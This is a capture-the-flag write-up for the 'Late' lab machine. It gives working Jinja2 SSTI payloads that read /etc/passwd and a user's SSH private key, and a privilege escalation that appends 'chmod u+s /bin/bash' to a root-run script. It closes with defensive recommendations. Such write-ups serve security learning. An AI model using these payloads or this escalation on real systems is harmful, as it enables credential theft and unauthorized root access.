## Synopsis

Late is an easy Linux machine running a Flask-based web application vulnerable to **Server-Side Template Injection (SSTI)** in the OCR functionality.  
By exploiting this vulnerability, it is possible to read sensitive files and exfiltrate an SSH private key, allowing access as a low-privileged user.  
Privilege escalation is achieved by abusing a root-executed script with the append-only attribute, appending a command that grants SUID privileges to `/bin/bash` and obtaining a root shell.

---
## Skills Required

- Basic web enumeration  
- Familiarity with Python Jinja2 SSTI exploitation  
- Linux privilege escalation techniques  
- Understanding of file attributes (`lsattr`) and cron/SSH hooks  

## Skills Learned

- Identifying and exploiting **SSTI vulnerabilities**  
- Reading sensitive files via template injection  
- Using `pspy` to monitor root processes  
- Exploiting append-only file attributes for privilege escalation

## 1. Initial Enumeration

### 1.1 Connectivity Test

To verify if the host is reachable, we send a single ICMP packet:

```bash
ping -c 1 10.10.11.156
```

![](screenshots/ping.png)

The host responds, confirming it is alive.

---
### 1.2 Port Scanning

We run a full TCP port scan to identify open services:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.156 -oG allPorts
```

- `-p-`: Scan all 65,535 ports  
- `--open`: Show only open ports  
- `-sS`: SYN scan  
- `--min-rate 5000`: Increase speed  
- `-Pn`: Skip host discovery (already confirmed alive)  
- `-oG`: Output in grepable format

![](screenshots/allports.png)

Extract the open ports:

```bash
extractPorts allPorts
```

![](screenshots/extractports.png)

---
### 1.3 Targeted Scan

Using the identified ports, we perform a targeted scan with version detection and default scripts:

```bash
nmap -p22,80 -sC -sV 10.10.11.156 -oN targeted
```

- `-sC`: Run default NSE scripts  
- `-sV`: Detect service versions  
- `-oN`: Output in human-readable format  

Let's check the result:

```bash
cat targeted -l java
```

![](screenshots/targeted.png)

**Findings:**

| Port | Service | Description |
|------|---------|-------------|
| 22   | SSH     | OpenSSH (version as per scan) |
| 80   | HTTP    | Flask/Jinja2 web application |

At this stage we confirm the target is a **Linux machine running a Flask web app with SSH access**.

---
## 2. Web Enumeration

### 2.1 Technology Fingerprinting

```bash
whatweb http://10.10.11.156
```

![](screenshots/whatweb.png)

The scan indicates a **Flask/Jinja2 stack**.

---
### 2.2 Virtual Host Discovery

During browsing, we find a reference to **image.late.htb**.  
After adding it to `/etc/hosts`, we can access the application:

![](screenshots/web.png)

The vhost provides **OCR functionality** (uploading an image generates a `results.txt` file).

---
## 3. Exploitation

### 3.1 SSTI Probe

We test for SSTI by uploading an image containing `{{7*7}}`:

![](screenshots/image_49.png)

Result:

![](screenshots/result_49.png)

The output returns `49`, confirming **SSTI in Jinja2**.

---
### 3.2 Reading `/etc/passwd`

We exploit SSTI to read system files:

```jinja
{{get_flashed_message.__globals__.__builtins__.open("/etc/passwd").read() }}
```

![](screenshots/etc_passwd.png)

Filter valid shells:

```bash
cat etc_passwd.txt | grep "sh$"
```

![](screenshots/etc_passwd_sh.png)

Users identified:
- `root`
- `svc_acc`

---
### 3.3 Exfiltrating SSH Private Key

We attempt to read the user‚Äôs private key:

```jinja
{{ get_flashed_messages.__globals__.__builtins__.open("/home/svc_acc/.ssh/id_rsa").read() }}
```

![](screenshots/image_id_rsa.png)

Result file:

![](screenshots/id_rsa.png)

We clean the key to ensure a valid PEM format:

![](screenshots/id_rsa_clean.png)

---
## 4. Foothold

Using the extracted key, we log in via SSH:

```bash
ssh -i id_rsa svc_acc@10.10.11.156
```

![](screenshots/user_flag.png)

‚úÖ **User flag obtained**

---
## 5. Privilege Escalation

### 5.1 Hunting Writable Files

We search for files owned by `svc_acc` outside common directories:

```bash
find / -user svc_acc 2>/dev/null | grep -vE "proc|run|var|sys|home"
```

![](screenshots/proc_svc_acc.png)

We find:

```
/usr/local/sbin/ssh-alert.sh
```

---
### 5.2 Inspecting the Script

```bash
ls -l /usr/local/sbin/ssh-alert.sh
cat /usr/local/sbin/ssh-alert.sh
```

![](screenshots/svc_acc_ssh_alert.png)

This script is executed as **root** when someone logs in via SSH.

---
### 5.3 Process Monitoring with pspy

We upload `pspy64` and monitor processes:

```bash
chmod +x pspy64
./pspy64
```

![](screenshots/pspy.png)
![](screenshots/pspy_running.png)

When logging in again, we confirm the script is executed by **root**.

---
### 5.4 Exploiting Append-Only Attribute

Attempts to edit fail:

![](screenshots/ssh_alert_edit_fail.png)

So we inspect attributes:

```bash
lsattr /usr/local/sbin/ssh-alert.sh 
```

![](screenshots/ssh_alert_priv.png)

The file has the **append-only (`a`)** attribute.  
We cannot overwrite it, but we can append malicious commands.

We append a line to set SUID on `/bin/bash`:

```bash
echo "chmod u+s /bin/bash" > bash.txt
cat bash.txt >> /usr/local/sbin/ssh-alert.sh
```

![](screenshots/ssh_alerts_command_injection.png)

After logging in again, `/bin/bash` has the SUID bit set.  
We escalate:

```bash
ls -l /bin/bash
bash -p
```

## Defensive Recommendations

- Sanitize user input and prevent **SSTI in Jinja2** templates.  
- Do not expose sensitive files (e.g., SSH keys) in applications.  
- Avoid root-owned scripts writable by non-root users.  
- Regularly monitor and audit file attributes with `lsattr`.  
- Prevent insecure hooks on SSH logins.  
- Monitor privilege changes such as unexpected SUID binaries.
